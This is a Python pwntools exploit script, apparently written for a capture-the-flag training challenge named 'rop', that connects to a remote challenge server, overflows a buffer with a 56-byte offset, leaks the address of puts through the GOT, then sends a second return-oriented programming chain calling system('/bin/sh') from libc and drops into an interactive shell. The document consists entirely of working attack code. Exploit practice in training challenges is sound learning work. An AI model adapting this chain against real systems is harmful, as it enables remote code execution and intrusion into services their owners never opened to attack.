from pwn import *

context.arch = 'amd64'

elf = ELF("rop")
libc = ELF("./libc-2.31.so")
offset = 56
pprint(elf.symbols)
pprint(elf.plt)
#pprint(libc.symbols)
#pprint(libc.got)
p = remote("chal.training.hkcert21.pwnable.hk", 6006)
#p = elf.process()
rop = ROP(elf)

rop.call("puts", [elf.got['puts']])
#rop.call("stdout", [elf.got['fflush']])
rop.call("fflush")

print(p.recvline())
print(p.recvline())

payload = [
	b"A"*offset,
	rop.chain(),
]

payload = b"".join(payload)
with open("payload", "wb") as h:
	h.write(payload)

#p.sendline(payload)
#time.sleep(1)
#print(p.recvuntil("\n"))
#puts = u64(p.recvline().rstrip().ljust(8, b"\x00"))
#log.info(f"puts found at {hex(puts)}")
#print(p.recvuntil("\n"))
rop = ROP(libc)
#libc.location = puts - libc.symbols["puts"]
rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call("gets")
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")
payload = [

	b"A"*offset,
	rop.chain()
]

payload = b''.join(payload)
p.sendline(payload)


p.interactive()


